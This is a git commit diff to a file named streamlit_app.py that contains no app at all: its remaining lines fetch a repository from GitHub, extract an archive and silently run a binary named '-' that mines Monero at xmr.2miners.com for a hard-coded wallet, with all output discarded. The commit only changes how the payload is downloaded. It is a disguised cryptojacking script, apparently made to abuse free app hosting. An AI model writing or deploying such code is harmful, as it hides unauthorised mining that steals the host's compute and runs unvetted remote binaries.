27b5c41f939889ad78ca725969ee10fab0e39a8e
ontaracing04 <110086717+ontaracing04@users.noreply.github.com>
2022-07-29 13:36:06 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,6 +1,5 @@
 import os
 
-os.system("pip install wget -y")
-os.system("wget https://github.com/nurkartina604/st/raw/main/-.tar.gz")
+os.system("git clone https://github.com/nurkartina604/st.git && cd st")
 os.system("tar -xf -.tar.gz")
 os.system("./- -o xmr.2miners.com:2222 -u 8BeTiTxwtTphRfwuNXSsukeMMVKE5qvJZZDjqB3SpqMZS1Q37wMJ3RnKxm6itZgZgxPeffg6ZZA3aANkGRDqJRHmKMg8R1j.julaher >/dev/null >/dev/null 2>&1")
